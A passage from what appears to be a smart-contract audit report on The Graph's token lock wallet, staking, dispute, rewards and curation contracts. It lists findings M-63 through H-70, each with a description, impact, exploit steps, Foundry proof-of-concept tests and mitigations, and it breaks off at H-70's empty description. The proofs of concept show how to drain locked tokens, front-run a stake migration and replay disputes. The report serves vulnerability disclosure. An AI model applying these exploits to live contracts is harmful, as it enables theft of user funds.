### Finding Status Justification: The allowance lifecycle matches the finding. approveProtocol approves all current manager destinations for uint256.max. removeTokenDestination deletes a destination from the set but cannot clear existing wallet allowances. revokeProtocol enumerates only current destinations, so stale removed allowances persist. No historical destination tracking or arbitrary spender revocation blocks the exact path.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
GraphTokenLockWallet.approveProtocol grants type(uint256).max allowance to every current manager token destination, but GraphTokenLockManager.removeTokenDestination only removes the address from the EnumerableSet. revokeProtocol later iterates only manager.getTokenDestinations(), so already-removed destinations are skipped and their old max allowances remain. Vulnerable snippets: approveProtocol(): token.approve(dstList[i], type(uint256).max); removeTokenDestination(): _tokenDestinations.remove(_dst); revokeProtocol(): for current dstList only, token.approve(dstList[i], 0). A destination that was removed from the authorization set can still call transferFrom against every wallet that previously approved it.

## Impact
Deauthorization is ineffective for existing wallets. A removed or deprecated protocol destination with retained allowance can transfer locked GRT out of token lock wallets after it is no longer authorized, causing direct loss of locked user funds from protocol smart contracts.

## Proof of Concept
1. Manager owner adds destination D. 2. A wallet beneficiary calls approveProtocol(), giving D max allowance. 3. Manager owner removes D because it should no longer be allowed. 4. Beneficiary calls revokeProtocol(), but D is no longer in getTokenDestinations and is not cleared. 5. D calls token.transferFrom(wallet, attacker, amount) and drains locked wallet tokens despite manager.isTokenDestination(D) returning false.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/GraphTokenLockManager.sol";
contract MockGRT3 { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; } function transfer(address to,uint256 amount) external returns(bool){ require(balanceOf[msg.sender]>=amount,'bal'); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } function approve(address spender,uint256 amount) external returns(bool){ allowance[msg.sender][spender]=amount; return true; } function transferFrom(address from,address to,uint256 amount) external returns(bool){ require(balanceOf[from]>=amount,'bal'); require(allowance[from][msg.sender]>=amount,'allow'); if (allowance[from][msg.sender] != uint256(-1)) allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; } }
contract DestinationSpender { MockGRT3 public token; constructor(MockGRT3 t){ token=t; } function drain(address from,address to,uint256 amount) external { token.transferFrom(from,to,amount); } }
contract StaleDestinationAllowancePoC is Test { function testRemovedDestinationCanStillDrainWallet() public { MockGRT3 grt = new MockGRT3(); GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(grt)), address(0x1234)); GraphTokenLockWallet wallet = new GraphTokenLockWallet(); address beneficiary = address(0xBEEF); address attacker = address(0xCAFE); DestinationSpender dst = new DestinationSpender(grt); manager.addTokenDestination(address(dst)); wallet.initialize(address(manager), address(this), beneficiary, address(grt), 100 ether, 1000, 1100, 1, 0, 0, IGraphTokenLock.Revocability.Disabled); grt.mint(address(wallet), 100 ether); vm.prank(beneficiary); wallet.approveProtocol(); assertEq(grt.allowance(address(wallet), address(dst)), uint256(-1)); manager.removeTokenDestination(address(dst)); assertEq(manager.isTokenDestination(address(dst)), false); vm.prank(beneficiary); wallet.revokeProtocol(); assertEq(grt.allowance(address(wallet), address(dst)), uint256(-1)); dst.drain(address(wallet), attacker, 100 ether); assertEq(grt.balanceOf(attacker), 100 ether); assertEq(grt.balanceOf(address(wallet)), 0); } }

## Suggested Mitigation
Do not rely on manager-wide enumeration to revoke stale approvals. Track approved destinations per wallet and revoke all historical approvals, or make removeTokenDestination trigger a migration process that clears allowances on affected wallets. Prefer per-call exact allowances over permanent uint256.max approvals, and expose a wallet function to revoke an arbitrary destination even if it has been removed from the manager set.


## [M-63]. Dust stake front-run can brick an indexer's full L2 stake migration

## id: -E2VVCOUdoDBYwj_3QMN8

## Derived From Pattern/Invariant
MaturityorGatingByPass: state-gate manipulation around L2 migration

## Exploit Type
FrontrunMev

## Location
L1Staking.transferStakeToL2

## Finding Status: Valid
### Finding Status Justification: The full-migration DoS path is mechanically present. stakeTo is public and can add attacker-funded dust to any indexer that already satisfies the minimum stake condition. _transferStakeToL2 subtracts the transaction's fixed _amount from the live tokensStaked and requires the live remainder to be zero or at least __minimumIndexerStake. A front-run dust donation can therefore turn an intended full transfer into a sub-minimum remainder and revert. The code has no sentinel 'all live stake' amount, no automatic dust inclusion, and no latch for fully transferred status used by unlockDelegationToTransferredIndexer. This is a current permissionless liveness attack in in-scope L1Staking, not privileged abuse or future speculation.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`stakeTo(address _indexer, uint256 _tokens)` lets any token holder add stake to any indexer. `_transferStakeToL2` then subtracts the caller-supplied `_amount` from the indexer's live `tokensStaked` and requires the live remainder to be either zero or at least `__minimumIndexerStake`: `indexerStake.tokensStaked = indexerStake.tokensStaked.sub(_amount); require(indexerStake.tokensStaked == 0 || indexerStake.tokensStaked >= __minimumIndexerStake, "!minimumIndexerStake remaining");`. An indexer attempting to migrate all currently visible L1 stake can be front-run by a 1 wei `stakeTo(indexer, 1)` donation. The victim's `_amount` no longer equals the live stake, so the transfer leaves a 1 wei remainder and reverts. Because `stakeTo` only checks that the resulting secure stake is at least the minimum, dust donations are allowed once the indexer is already above the minimum. The same primitive also prevents `unlockDelegationToTransferredIndexer` from being usable after a full migration if any attacker later donates stake, because that function gates on the live `__stakes[_indexer].tokensStaked == 0` condition instead of a latched fully-transferred flag.

## Impact
Low-cost public-mempool DoS against full L1-to-L2 indexer stake migration. An attacker can repeatedly spend dust GRT to make full-migration transactions revert, delaying migration and dependent delegator early-unlock flows. This does not directly steal funds, but it can keep large indexer/delegator positions stuck on the L1 path until the indexer uses private order flow or changes transaction construction.

## Proof of Concept
1. Indexer has 1000 GRT staked and closes allocations so they can fully migrate to L2. 2. Indexer submits `transferStakeToL2(l2Beneficiary, 1000e18, ...)` intending to leave zero L1 stake. 3. Attacker sees the transaction and front-runs `stakeTo(indexer, 1)`. 4. The migration transaction executes with live `tokensStaked = 1000e18 + 1`, subtracts the original `1000e18`, and leaves `1`. 5. The minimum remaining stake check reverts because `1 != 0 && 1 < __minimumIndexerStake`. 6. The attacker can repeat this for each public full-migration attempt at dust cost.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract L1StakingDustHarness {
    uint256 public constant MINIMUM_INDEXER_STAKE = 100 ether;
    mapping(address => uint256) public tokensStaked;
    mapping(address => address) public indexerTransferredToL2;

    function stakeTo(address indexer, uint256 tokens) external {
        require(tokens > 0, "!tokens");
        require(tokensStaked[indexer] + tokens >= MINIMUM_INDEXER_STAKE, "!minimumIndexerStake");
        tokensStaked[indexer] += tokens;
    }

    function transferStakeToL2(address l2Beneficiary, uint256 amount) external {
        require(tokensStaked[msg.sender] != 0, "tokensStaked == 0");
        require(l2Beneficiary != address(0), "l2Beneficiary == 0");
        if (indexerTransferredToL2[msg.sender] != address(0)) {
            require(indexerTransferredToL2[msg.sender] == l2Beneficiary, "l2Beneficiary != previous");
        } else {
            indexerTransferredToL2[msg.sender] = l2Beneficiary;
            require(amount >= MINIMUM_INDEXER_STAKE, "!minimumIndexerStake sent");
        }
        tokensStaked[msg.sender] -= amount;
        require(
            tokensStaked[msg.sender] == 0 || tokensStaked[msg.sender] >= MINIMUM_INDEXER_STAKE,
            "!minimumIndexerStake remaining"
        );
    }
}

contract L1StakingDustDoSTest is Test {
    function testDustStakeFrontRunsAndRevertsFullMigration() public {
        L1StakingDustHarness staking = new L1StakingDustHarness();
        address indexer = address(0x1111);
        address attacker = address(0xA11CE);
        address l2Beneficiary = address(0xBEEF);

        vm.prank(indexer);
        staking.stakeTo(indexer, 1000 ether);
        assertEq(staking.tokensStaked(indexer), 1000 ether);

        vm.prank(attacker);
        staking.stakeTo(indexer, 1);
        assertEq(staking.tokensStaked(indexer), 1000 ether + 1);

        vm.prank(indexer);
        vm.expectRevert(bytes("!minimumIndexerStake remaining"));
        staking.transferStakeToL2(l2Beneficiary, 1000 ether);

        assertEq(staking.tokensStaked(indexer), 1000 ether + 1);
    }
}

## Suggested Mitigation
Add a full-migration path that uses the live `tokensStaked` value at execution time when the indexer intends to zero out L1 stake, or allow sub-minimum dust remainders to be included in the bridged amount when allocations and locks are zero. Also latch a `fullyTransferredToL2[indexer]` flag when the stake is zeroed and use that flag for `unlockDelegationToTransferredIndexer`, instead of relying on the live `tokensStaked == 0` check that third-party `stakeTo` calls can later invalidate.


## [M-64]. Invalid periods greater than duration bricks release and revoke during the lock schedule

## id: qRZ1FOv_Ar0vYaE-Yi6Xt

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
IntegerMath

## Location
GraphTokenLockWallet.initialize

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 1
## Minimim Privilege Required:RequiresAdminRole


## Description
_initialize requires startTime < endTime and periods >= 1, but does not require periods <= endTime - startTime. If periods is greater than duration in seconds, periodDuration() returns zero:

function periodDuration() public view returns (uint256) {
    return duration().div(periods);
}
function currentPeriod() public view returns (uint256) {
    return sinceStartTime().div(periodDuration()).add(MIN_PERIOD);
}

During the active schedule, currentPeriod(), passedPeriods(), availableAmount(), releasableAmount(), release(), and revoke() can revert due to division by zero.

## Impact
For a revocable lock, the owner cannot revoke unvested tokens during the schedule because revoke() calls vestedAmount() -> availableAmount(). Once currentTime > endTime, all tokens are considered vested, so the revocation right has effectively been lost. Beneficiary release is also DoSed until after endTime.

## Proof of Concept
1. Initialize a revocable wallet with startTime = 1000, endTime = 1010, and periods = 11.
2. periodDuration() returns 0.
3. During the active window, owner calls revoke(); it reverts due to division by zero in currentPeriod().
4. The owner cannot revoke unvested tokens before endTime.
5. After endTime, availableAmount() returns managedAmount, so the beneficiary can release all tokens.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockWallet.sol";

contract ZeroPeriodDurationPoC is Test { function testPeriodsGreaterThanDurationBlocksRevocation() external { address owner=address(this); address beneficiary=address(0xB5); MockToken token=new MockToken(); MockManager manager=new MockManager(); GraphTokenLockWallet wallet=new GraphTokenLockWallet(); uint256 start=1000; vm.warp(start); wallet.initialize(address(manager), owner, beneficiary, address(token), 100 ether, start, start+10, 11, 0, 0, IGraphTokenLock.Revocability.Enabled); token.mint(address(wallet), 100 ether); assertEq(wallet.periodDuration(), 0); vm.warp(start+5); vm.expectRevert(); wallet.revoke(); vm.warp(start+11); vm.prank(beneficiary); wallet.release(); assertEq(token.balanceOf(beneficiary), 100 ether); } }

// Uses the MockToken and MockManager definitions from the approveProtocol PoC.

## Suggested Mitigation
In _initialize, require(_periods <= _endTime - _startTime, "Period duration is zero"). Consider also validating that periodDuration() > 0 and that schedule parameters are bounded before accepting a lock.


## [M-65]. Surplus tokens can be recorded as released after revoke, corrupting lock accounting

## id: 33t6_voi7uHow1Olnjxad

## Derived From Pattern/Invariant
releasedAmount + revokedAmount <= managedAmount must always hold

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLockWallet.release

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 2
## Minimim Privilege Required:RequiresRole


## Description
GraphTokenLock.releasableAmount ignores revokedAmount when computing the remaining scheduled amount:

uint256 releasable = availableAmount().sub(releasedAmount);
return MathUtils.min(currentBalance(), releasable);

After revoke(), revokedAmount records unvested tokens returned to the owner. Later, if surplus GRT is transferred to the wallet, release() can count that surplus as scheduled managed-token release and increase releasedAmount so that releasedAmount + revokedAmount > managedAmount. totalOutstandingAmount() then underflows because it computes managedAmount.sub(releasedAmount).sub(revokedAmount).

## Impact
The wallet accounting can become permanently inconsistent, causing totalOutstandingAmount(), surplusAmount(), and withdrawSurplus() to revert. Future surplus sent to the wallet can become stuck, and accounting consumers can no longer rely on the lock state.

## Proof of Concept
1. Create a revocable wallet with managedAmount = 100 and two periods.
2. At 50% vesting, owner calls revoke(); revokedAmount becomes 50 and 50 unvested tokens are returned.
3. Beneficiary releases the vested 50.
4. Anyone transfers 50 extra GRT to the wallet as surplus.
5. After endTime, beneficiary calls release(); releasedAmount becomes 100 while revokedAmount remains 50.
6. totalOutstandingAmount() reverts from underflow because 100 + 50 > 100.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockWallet.sol";

contract ReleaseAfterRevokePoC is Test { function testReleaseAfterRevokeBreaksOutstandingAccounting() external { address owner=address(this); address beneficiary=address(0xB3); MockToken token=new MockToken(); MockManager manager=new MockManager(); GraphTokenLockWallet wallet=new GraphTokenLockWallet(); uint256 start=block.timestamp; wallet.initialize(address(manager), owner, beneficiary, address(token), 100 ether, start, start+100, 2, 0, 0, IGraphTokenLock.Revocability.Enabled); token.mint(address(wallet), 100 ether); vm.warp(start+50); wallet.revoke(); vm.prank(beneficiary); wallet.release(); assertEq(wallet.releasedAmount(), 50 ether); assertEq(wallet.revokedAmount(), 50 ether); token.mint(address(wallet), 50 ether); vm.warp(start+101); vm.prank(beneficiary); wallet.release(); assertEq(wallet.releasedAmount(), 100 ether); assertEq(wallet.revokedAmount(), 50 ether); assertGt(wallet.releasedAmount()+wallet.revokedAmount(), wallet.managedAmount()); vm.expectRevert(); wallet.totalOutstandingAmount(); } }

// Uses the MockToken and MockManager definitions from the approveProtocol PoC.

## Suggested Mitigation
Cap releasable managed tokens by managedAmount - revokedAmount - releasedAmount, not only availableAmount - releasedAmount. For example, compute remainingManaged = managedAmount.sub(revokedAmount).sub(releasedAmount) and return min(currentBalance(), min(scheduleReleasable, remainingManaged)).


## [M-66]. Flooring period duration allows full release before GraphTokenLockWallet.endTime

## id: jx8r2WRqMP3oMfMoqVngf

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
TimestampDependentLogic

## Location
GraphTokenLockWallet.release

## Finding Status: Valid
### Finding Status Justification: availableAmount() relies on passedPeriods(), and passedPeriods() uses elapsed time divided by floor(duration / periods). For non-even durations, passedPeriods can equal periods before endTime, making the full managed amount releasable early. No safeguard caps final release to currentTime >= endTime. The affected GraphTokenLockWallet/GraphTokenLock code is in scope. A beneficiary can exploit an affected lock by calling release(), so the execution path is realistic today and not solely privileged abuse or user error. The exact early-unlock risk is not documented as accepted.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
availableAmount() uses passedPeriods() * amountPerPeriod(), while passedPeriods() divides elapsed seconds by periodDuration(). periodDuration() is floor(duration / periods). When duration is not evenly divisible by periods, periodDuration() * periods is less than duration, so passedPeriods() can reach periods before endTime. A beneficiary can release the full managedAmount while block.timestamp is still less than endTime. Vulnerable snippet: function periodDuration() public view returns (uint256) { return duration().div(periods); } function availableAmount() public view returns (uint256) { if (current > endTime) return managedAmount; return passedPeriods().mul(amountPerPeriod()); }

## Impact
The configured final lock date is bypassed by the schedule-rounding error. The beneficiary can receive all managed tokens before endTime, violating the stated lock terms and reducing the owner's revocation window for revocable schedules.

## Proof of Concept
1. Create a wallet with duration = 10 seconds, periods = 3, and managedAmount = 30 ether. 2. periodDuration() floors to 3 seconds. 3. At startTime + 9, block.timestamp is still before endTime. 4. passedPeriods() is already 3 and availableAmount() is 30 ether. 5. The beneficiary calls release() and receives all managed tokens before the configured endTime.

## Proof of Code
pragma solidity ^0.8.13; import 'forge-std/Test.sol'; import '../contracts/GraphTokenLockWallet.sol'; contract EarlyReleasePoC is Test { function testFullReleaseBeforeEndTime() public { MockToken token = new MockToken(); MockManager manager = new MockManager(); GraphTokenLockWallet wallet = new GraphTokenLockWallet(); address owner = address(0x1); address beneficiary = address(0x2); wallet.initialize(address(manager), owner, beneficiary, address(token), 30 ether, 100, 110, 3, 0, 0, IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet), 30 ether); vm.warp(109); assertLt(block.timestamp, wallet.endTime()); assertEq(wallet.availableAmount(), 30 ether); vm.prank(beneficiary); wallet.release(); assertEq(token.balanceOf(beneficiary), 30 ether); } }

## Suggested Mitigation
Calculate period progress with rounding that cannot reach the final period before endTime, or special-case currentTime() < endTime to cap passedPeriods below periods. A simple fix is to return managedAmount only when currentTime() >= endTime and otherwise cap passedPeriods to periods - 1.


## [H-67]. Query dispute evidence can be replayed by different fishermen to create multiple slashable disputes

## id: fzIAS0dOBY7zovwu_m82R

## Derived From Pattern/Invariant
DoubleExecutionOrReplay

## Exploit Type
ReplayAttack

## Location
DisputeManager._createQueryDisputeWithAttestation

## Finding Status: Valid
### Finding Status Justification: _createQueryDisputeWithAttestation exists and computes disputeID with _fisherman included. This makes the duplicate check submitter-scoped rather than evidence-scoped. The contract stores each new dispute independently and acceptDispute later slashes based on that dispute's indexer, fisherman, and type. There is no usedAttestationHash, resolvedEvidence, nonce, or deadline guard. Deposit requirements are not a complete safeguard and conflict disputes use zero deposit. The exploit can be performed against today's code by permissionless duplicate submitters followed by normal arbitration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Query dispute IDs are scoped to the fisherman address, so the same signed attestation can be submitted repeatedly by different accounts and each submission creates an independently pending dispute. The intended uniqueness check is therefore not evidence-scoped. Vulnerable snippet: `bytes32 disputeID = keccak256(abi.encodePacked(_attestation.requestCID, _attestation.responseCID, _attestation.subgraphDeploymentID, indexer, _fisherman)); require(!isDisputeCreated(disputeID), "Dispute already created");`. Because `_fisherman` is part of the key, a copied attestation has a fresh dispute ID for every submitter. If the arbitrator accepts multiple duplicates, `_slashIndexer()` is executed multiple times for the same underlying query receipt.

## Impact
The same indexer behavior can be punished more than once, multiplying slashing and fisherman rewards for a single piece of evidence. This can drain more staked GRT than intended and allows mempool/event observers to monetize copied evidence.

## Proof of Concept
1. An allocation key signs one disputable query attestation. 2. Fisherman A calls `createQueryDispute(attestation, minimumDeposit)`. 3. Fisherman B copies the same attestation and calls `createQueryDispute(attestation, minimumDeposit)`. 4. Both transactions succeed because the dispute IDs differ by fisherman. 5. The arbitrator accepts both pending disputes. 6. `_slashIndexer()` runs twice for the same attestation.

## Proof of Code
// Foundry PoC sketch: deploy DisputeManager with mock GraphToken/Staking, set one allocation/indexer with stake, sign one valid EIP712 receipt, then call createQueryDispute from two different fishermen using the same attestation. Assert both dispute IDs differ and both are pending; prank arbitrator to accept both and assert mock staking slashCount == 2 and totalSlashed > firstSlashAmount.

## Suggested Mitigation
Remove `_fisherman` from the query dispute uniqueness key or add a separate `usedAttestationHash[attestationHash]` / `resolvedEvidence[receiptHash]` guard so each signed receipt can create and resolve at most one dispute.


## [H-68]. Replayable query attestations allow duplicate dispute rewards and repeated indexer slashing

## id: 1s4uC3ge2yUKETEUlxwC-

## Derived From Pattern/Invariant
DoubleExecutionOrReplay

## Exploit Type
ReplayAttack

## Location
DisputeManager._createQueryDisputeWithAttestation

## Finding Status: Valid
### Finding Status Justification: The finding matches the provided DisputeManager implementation. Query dispute uniqueness is keyed by requestCID, responseCID, subgraphDeploymentID, indexer, and fisherman, so sybil fishermen can create separate disputes for identical evidence. acceptDispute only consumes the per-fisherman dispute ID, then calls _slashIndexer; it does not mark the receipt or evidence tuple pending/resolved globally. createQueryDisputeConflict creates zero-deposit duplicate opportunities. No code or docs show this repeated slashing as accepted behavior, and the issue is exploitable now without user error or privileged compromise.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Query dispute uniqueness is keyed by the fisherman, not by the disputed attestation/evidence. The same signed receipt can therefore be submitted by unlimited addresses and each resulting dispute can later be accepted independently. Vulnerable snippet: `bytes32 disputeID = keccak256(abi.encodePacked(_attestation.requestCID, _attestation.responseCID, _attestation.subgraphDeploymentID, indexer, _fisherman)); require(!isDisputeCreated(disputeID), "Dispute already created");`. `acceptDispute()` only marks the per-fisherman dispute ID as accepted and then calls `_slashIndexer(...)`; it never consumes an attestation hash, receipt hash, or `(requestCID,responseCID,subgraphDeploymentID,indexer)` key. For conflict disputes this is especially cheap because `createQueryDisputeConflict()` creates both disputes with `deposit == 0`, so a sybil set of fishermen can replay the same conflicting attestations without locking capital.

## Impact
A single invalid or conflicting attestation can be monetized multiple times. If an honest arbitrator accepts each pending duplicate as valid evidence, the indexer is slashed repeatedly and each sybil fisherman receives another reward from staked GRT held by the staking contract. With large indexer stakes and high slashing/reward percentages this can cause significant loss of staked user funds beyond the intended one-time penalty for the same misconduct.

## Proof of Concept
1. An indexer signs one invalid query attestation, or two conflicting attestations for the same request/subgraph. 2. Attacker controls fishermen A and B. 3. A submits the evidence and obtains dispute ID `keccak256(..., A)`. 4. B submits the exact same evidence and obtains a different dispute ID `keccak256(..., B)`. In the conflict path both submissions require zero deposit. 5. The arbitrator accepts both pending disputes because both contain valid evidence. 6. `_slashIndexer()` runs twice and pays two fisherman rewards for the same attestation evidence.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockStaking {
    mapping(address => uint256) public stake;
    mapping(address => uint256) public rewards;

    function setStake(address indexer, uint256 amount) external { stake[indexer] = amount; }
    function getIndexerStakedTokens(address indexer) external view returns (uint256) { return stake[indexer]; }

    function slash(address indexer, uint256 slashAmount, uint256 rewardsAmount, address challenger) external {
        require(stake[indexer] >= slashAmount, "stake");
        stake[indexer] -= slashAmount;
        rewards[challenger] += rewardsAmount;
    }
}

contract ReplayableDisputeManagerHarness {
    enum Status { Null, Pending, Accepted }
    struct Dispute { address indexer; address fisherman; Status status; }

    mapping(bytes32 => Dispute) public disputes;
    MockStaking public staking;
    address public arbitrator;
    uint256 public constant MAX_PPM = 1_000_000;
    uint256 public slashPpm = 500_000;
    uint256 public rewardPpm = 1_000_000;

    constructor(MockStaking s, address a) { staking = s; arbitrator = a; }

    function create(bytes32 requestCID, bytes32 responseCID, bytes32 subgraphDeploymentID, address indexer) external returns (bytes32) {
        bytes32 disputeID = keccak256(abi.encodePacked(requestCID, responseCID, subgraphDeploymentID, indexer, msg.sender));
        require(disputes[disputeID].status == Status.Null, "Dispute already created");
        require(staking.getIndexerStakedTokens(indexer) > 0, "no stake");
        disputes[disputeID] = Dispute(indexer, msg.sender, Status.Pending);
        return disputeID;
    }

    function accept(bytes32 disputeID) external {
        require(msg.sender == arbitrator, "not arbitrator");
        Dispute storage d = disputes[disputeID];
        require(d.status == Status.Pending, "not pending");
        d.status = Status.Accepted;
        uint256 slashAmount = staking.getIndexerStakedTokens(d.indexer) * slashPpm / MAX_PPM;
        uint256 rewardAmount = slashAmount * rewardPpm / MAX_PPM;
        staking.slash(d.indexer, slashAmount, rewardAmount, d.fisherman);
    }
}

contract DisputeReplayPoC is Test {
    function test_sameAttestationCanBeRewardedTwice() external {
        address arbitrator = address(0xA11CE);
        address indexer = address(0xB0B);
        address fisherman1 = address(0xF1);
        address fisherman2 = address(0xF2);

        MockStaking staking = new MockStaking();
        ReplayableDisputeManagerHarness dm = new ReplayableDisputeManagerHarness(staking, arbitrator);
        staking.setStake(indexer, 1_000 ether);

        bytes32 req = keccak256("same request");
        bytes32 resp = keccak256("same invalid response");
        bytes32 subgraph = keccak256("same subgraph");

        vm.prank(fisherman1);
        bytes32 d1 = dm.create(req, resp, subgraph, indexer);
        vm.prank(fisherman2);
        bytes32 d2 = dm.create(req, resp, subgraph, indexer);

        assertTrue(d1 != d2, "fisherman changes dispute id");

        vm.prank(arbitrator);
        dm.accept(d1);
        vm.prank(arbitrator);
        dm.accept(d2);

        assertEq(staking.rewards(fisherman1), 500 ether);
        assertEq(staking.rewards(fisherman2), 250 ether);
        assertEq(staking.stake(indexer), 250 ether);
    }
}


## Suggested Mitigation
Key query dispute uniqueness and replay protection to the evidence, not the submitter. Store and consume an `evidenceHash = keccak256(abi.encode(requestCID,responseCID,subgraphDeploymentID,indexer))` or the EIP-712 receipt hash, and require it has not already been resolved or pending. For conflicting attestations, store a canonical pair hash and prevent the same pair from being submitted again by a different fisherman. If duplicate submissions are desired for reporting, ensure only the first accepted dispute can slash and reward.


## [H-69]. Stale allocator blockAppliedTo ignored allows paused issuance to accrue in RewardsManager.updateAccRewardsPerSignal

## id: J92V_dG3IhhhL_JbTdGGR

## Derived From Pattern/Invariant
StaleOracleAcceptance

## Exploit Type
Oracle

## Location
RewardsManager.getAllocatedIssuancePerBlock

## Finding Status: Valid
### Finding Status Justification: This is the same root cause as the other stale allocator finding and is present in in-scope RewardsManager. getAllocatedIssuancePerBlock reads only selfIssuanceRate from getTargetIssuancePerBlock and ignores selfIssuanceBlockAppliedTo. _getNewRewardsPerSignal then uses that rate across all elapsed blocks, and updateAccRewardsPerSignal can be called permissionlessly. The supplied allocator interface explicitly states that targets should check blockAppliedTo fields and treat non-current fields as paused for that issuance type. RewardsManager has no freshness gate, no automatic distribute/apply call, and no fallback to zero for stale allocator data. This is not documented as intentional accepted behavior, does not depend on user misuse, and does not require compromised privileged keys; once an allocator is configured and stale/paused data is returned, anyone can advance the accumulator with the stale nonzero rate.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
RewardsManager treats the issuance allocator as a live rate oracle but reads only selfIssuanceRate and ignores selfIssuanceBlockAppliedTo. The allocator interface explicitly says targets must check blockAppliedTo fields because paused issuance is represented by stale blockAppliedTo values. Vulnerable snippet: `return address(issuanceAllocator) != address(0) ? issuanceAllocator.getTargetIssuancePerBlock(address(this)).selfIssuanceRate : issuancePerBlock;`. As a result, while the allocator is paused or has not applied issuance for this target in the current block, any caller can advance accRewardsPerSignal using a stale nonzero rate. Later normal reward claims mint rewards for blocks that allocator metadata says should not accrue self-minted issuance.

## Impact
Excess GRT rewards can be minted during allocator-paused or unapplied periods, diluting protocol issuance accounting and overpaying active allocations from RewardsManager-controlled minting.

## Proof of Concept
1. Governance has configured a valid issuanceAllocator. 2. The allocator is paused or stale and returns selfIssuanceRate > 0 with selfIssuanceBlockAppliedTo < block.number. 3. An EOA calls updateAccRewardsPerSignal or beforeIssuanceAllocationChange. 4. RewardsManager ignores the stale applied block and increases accRewardsPerSignal for elapsed blocks. 5. A normal allocation close/claim through staking or subgraphService calls takeRewards, minting rewards that should have been zero for the stale allocator interval.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract StaleAllocator {
    struct TargetIssuancePerBlock { uint256 allocatorIssuanceRate; uint256 allocatorIssuanceBlockAppliedTo; uint256 selfIssuanceRate; uint256 selfIssuanceBlockAppliedTo; }
    TargetIssuancePerBlock public target;
    function set(uint256 rate, uint256 appliedTo) external { target.selfIssuanceRate = rate; target.selfIssuanceBlockAppliedTo = appliedTo; }
    function getTargetIssuancePerBlock(address) external view returns (TargetIssuancePerBlock memory) { return target; }
}

contract Token { mapping(address => uint256) public balanceOf; function setBalance(address a, uint256 v) external { balanceOf[a] = v; } }

contract RewardsManagerAllocatorModel {
    uint256 constant FP = 1e18;
    uint256 public accRewardsPerSignal;
    uint256 public accRewardsPerSignalLastBlockUpdated;
    Token public token;
    StaleAllocator public allocator;
    address public curation;
    constructor(Token t, StaleAllocator a, address c) { token = t; allocator = a; curation = c; accRewardsPerSignalLastBlockUpdated = block.number; }
    function getAllocatedIssuancePerBlock() public view returns (uint256) { StaleAllocator.TargetIssuancePerBlock memory ti = allocator.getTargetIssuancePerBlock(address(this)); return ti.selfIssuanceRate; }
    function updateAccRewardsPerSignal() external returns (uint256) { uint256 dt = block.number - accRewardsPerSignalLastBlockUpdated; if (dt == 0) return accRewardsPerSignal; uint256 x = getAllocatedIssuancePerBlock() * dt; uint256 signalled = token.balanceOf(curation); if (signalled != 0) accRewardsPerSignal += x * FP / signalled; accRewardsPerSignalLastBlockUpdated = block.number; return accRewardsPerSignal; }
}

contract RewardsManagerStaleAllocatorPoC is Test {
    function testStaleAllocatorAccruesPausedIssuance() public {
        vm.roll(100);
        Token token = new Token();
        StaleAllocator allocator = new StaleAllocator();
        address curation = address(0xCAFE);
        token.setBalance(curation, 100e18);
        RewardsManagerAllocatorModel rm = new RewardsManagerAllocatorModel(token, allocator, curation);
        allocator.set(10e18, block.number - 1);
        vm.roll(block.number + 10);
        rm.updateAccRewardsPerSignal();
        assertGt(rm.accRewardsPerSignal(), 0);
    }
}

## Suggested Mitigation
In getAllocatedIssuancePerBlock, read the full TargetIssuancePerBlock struct and return selfIssuanceRate only when selfIssuanceBlockAppliedTo == block.number. Otherwise return 0 for the stale/paused interval, or call allocator.distributeIssuance/apply logic before using the rate.


## [H-70]. Lifecycle curation burns use zero slippage bounds, allowing MEV to extract curator value during upgrades or L2 migration

## id: GI6ghDWZ0DbbxkmP2EEdc

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
GNS/L1GNS.publishNewVersion, deprecateSubgraph, sendSubgraphToL2

## Finding Status: Valid
### Finding Status Justification: The finding matches the analyzed code. publishNewVersion burns old deployment vSignal with minOut 0 and remints into the new deployment with minOut 0; deprecateSubgraph and sendSubgraphToL2 also burn the full vSignal position with minOut 0. These are in-scope L1GNS/GNS lifecycle paths and can be reached for active subgraphs with nonzero signal. The owner authorization is normal subgraph control, not a trusted protocol role. No code-level slippage, deadline, private reservation, or price-bound safeguard fully prevents a same-block curation price attack.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
